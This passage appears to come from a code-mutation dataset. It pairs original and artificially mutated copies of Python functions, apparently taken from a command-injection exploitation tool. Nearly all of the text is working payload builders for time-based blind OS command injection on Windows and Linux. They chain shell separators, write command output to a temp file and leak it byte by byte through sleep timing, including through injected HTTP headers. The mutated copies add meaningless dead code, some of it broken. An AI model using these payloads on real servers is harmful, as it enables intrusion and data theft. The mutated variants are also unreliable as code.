_urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.read().strip()))\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + \"'\" + TAG + \"'\" + ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + separator + 'str1=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ' + separator + '[ ' + str(j) + ' -eq ${str1} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"f = open(\\'' + OUTPUT_TEXTFILE + \"', 'w')\\nf.write('\" + TAG + '\\')\\nf.close()\\n\")' + settings.SINGLE_WHITESPACE + '[ ' + str(j) + ' -ne $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + '\\') as file: print(len(file.readline()))\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\") '\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    },
    {
        "func_name": "cmd_execution",
        "original": "def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + pipe + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + ampersand + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr '\\\\n' ' ' < \" + OUTPUT_TEXTFILE + ' )' + separator + 'echo $str > ' + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0 ' + separator + 'else sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1 < ' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1 > ' + OUTPUT_TEXTFILE + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr -d '\\\\n'<\" + OUTPUT_TEXTFILE + ')' + separator + 'echo $str' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ]' + separator + 'sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1<' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            cmd = cmd.rstrip()\n            cmd = checks.add_command_substitution(cmd)\n            payload = pipe + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ]' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
        "mutated": [
            "def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + pipe + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + ampersand + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr '\\\\n' ' ' < \" + OUTPUT_TEXTFILE + ' )' + separator + 'echo $str > ' + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0 ' + separator + 'else sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1 < ' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1 > ' + OUTPUT_TEXTFILE + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr -d '\\\\n'<\" + OUTPUT_TEXTFILE + ')' + separator + 'echo $str' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ]' + separator + 'sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1<' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            cmd = cmd.rstrip()\n            cmd = checks.add_command_substitution(cmd)\n            payload = pipe + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ]' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + pipe + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + ampersand + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr '\\\\n' ' ' < \" + OUTPUT_TEXTFILE + ' )' + separator + 'echo $str > ' + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0 ' + separator + 'else sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1 < ' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1 > ' + OUTPUT_TEXTFILE + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr -d '\\\\n'<\" + OUTPUT_TEXTFILE + ')' + separator + 'echo $str' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ]' + separator + 'sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1<' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            cmd = cmd.rstrip()\n            cmd = checks.add_command_substitution(cmd)\n            payload = pipe + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ]' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + pipe + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + ampersand + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n    else:\n        settings.USER_SUPPLIED_CMD = cmd\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr '\\\\n' ' ' < \" + OUTPUT_TEXTFILE + ' )' + separator + 'echo $str > ' + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + 'if [ ' + str(j) + ' -ne ${str1} ]' + separator + 'then sleep 0 ' + separator + 'else sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1 < ' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1 > ' + OUTPUT_TEXTFILE + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'sleep 0 ' + separator + 'str=$(' + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + \" tr -d '\\\\n'<\" + OUTPUT_TEXTFILE + ')' + separator + 'echo $str' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + 'str=$(cat ' + OUTPUT_TEXTFILE + ')' + separator + 'str1=$(expr length \"$str\")' + separator + '[ ' + str(j) + ' -eq ${str1} ]' + separator + 'sleep ' + str(timesec) + separator + 'str1=$(od -A n -t d1<' + OUTPUT_TEXTFILE + ')' + separator + 'echo $str1' + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            cmd = cmd.rstrip()\n            cmd = checks.add_command_substitution(cmd)\n            payload = pipe + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe + '[ ' + str(j) + ' -ne $(cat ' + OUTPUT_TEXTFILE + pipe + \"tr -d '\\\\n'\" + pipe + 'wc -c) ]' + separator + 'sleep ' + str(timesec)\n        else:\n            pass\n    return payload",
            "def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + pipe + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"' + pipe + 'for /f \"tokens=*\" %x in (\\'cmd /c \"' + 'powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c ' + cmd + ')))\"\\')' + settings.SINGLE_WHITESPACE + 'do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%x'\"\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c \"' + cmd + '\"\\') do ' + settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + \" '%i'\" + ampersand + 'for /f \"tokens=*\" %y in (\\'cmd /c \"powershell.exe -InputFormat none ([string](Get-Content ' + OUTPUT_TEXTFILE + ').length)\"\\')do if %y==' + str(j) + 